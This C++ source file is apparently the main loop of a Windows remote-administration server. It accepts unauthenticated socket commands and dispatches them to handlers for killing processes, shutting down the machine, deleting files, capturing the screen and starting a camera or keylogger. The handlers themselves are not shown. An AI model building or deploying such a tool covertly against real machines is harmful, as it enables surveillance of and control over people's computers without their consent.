#include "utils.h"

int main() {
    //cout << "o--------------------- INSTRUCTIONS ---------------------o\n";
    //cout << "|                                                        |\n";
    //cout << "|   list    [app|service]                                |\n";
    //cout << "|   start   [app|service]      [appPath|serviceName]     |\n";
    //cout << "|   stop    [app|service]      [processID|serviceName]   |\n";
    //cout << "|   power   [shutdown|restart]                           |\n";
    //cout << "|   file    [copy|delete]      srcPath [desPath]         |\n";
    //cout << "|   capture screen             outPath                   |\n";
    //cout << "|   start   [camera|keylogger]                           |\n";
    //cout << "|   stop    [camera|keylogger]                           |\n";
    //cout << "|   exit                                                 |\n";
    //cout << "|                                                        |\n";
    //cout << "o--------------------------------------------------------o\n";
    
    map<wstring, map<wstring, function<void()>>> handlers = setupHandlers();
    
    if (!AfxSocketInit()) {
        cerr << "\nFailed to initialize sockets. Error: " << GetLastError() << endl;
        return 0;
    }

    CSocket server;
    if (!server.Create(PORT)) {
        cerr << "\nFailed to create server socket. Error: " << GetLastError() << endl;
        return 0;
    }

    if (!server.Listen()) {
        cerr << "\nServer failed to listen. Error: " << GetLastError() << endl;
        return 0;
    }
    cout << "\nServer is listening on port " << PORT << "...\n";
        
    vector<wchar_t> buffer(BUFFER_SIZE);
    wstring cmd, opt;
    while (cmd.find(L"exit") == string::npos) {
        CSocket client;
        if (!server.Accept(client)) {
            cerr << "\nFailed to accept client connection. Error: " << GetLastError() << endl;
            return 0;
        }
        cout << "\nClient connected!\n";

        client.Receive(buffer.data(), BUFFER_SIZE * sizeof(wchar_t));
        wcout << "\nReceived from client: " << buffer.data() << endl;

        inp.str(buffer.data());
        inp.seekg(0);
        inp >> cmd >> opt;

        try {
            handlers[cmd][opt]();
        }
        catch (const exception& e) {
            if (strcmp(e.what(), "bad function call")) {
                out << "\nException: " << e.what() << endl;
            }
            else {
                out << "\nInvalid command!\n";
            }
        }
        wstring response = out.str();
        out.str(L"");
        client.Send(response.c_str(), (response.size() + 1) * sizeof(wchar_t));
        client.Close();
    }
    server.Close();
    
    return 0;
}